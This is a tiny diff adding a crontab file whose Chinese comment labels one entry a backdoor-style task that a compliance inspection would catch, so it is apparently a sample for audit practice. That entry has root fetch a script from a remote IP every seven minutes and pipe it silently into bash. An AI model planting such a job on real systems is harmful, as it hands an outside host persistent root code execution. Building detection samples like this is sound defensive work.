@@ -1,0 +1,6 @@
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# 运维留的后门式任务(等保排查必中)
+*/7 * * * * root curl -s http://198.51.100.23/agent.sh | bash >/dev/null 2>&1
+17 * * * * root /usr/local/bin/cleanup.sh
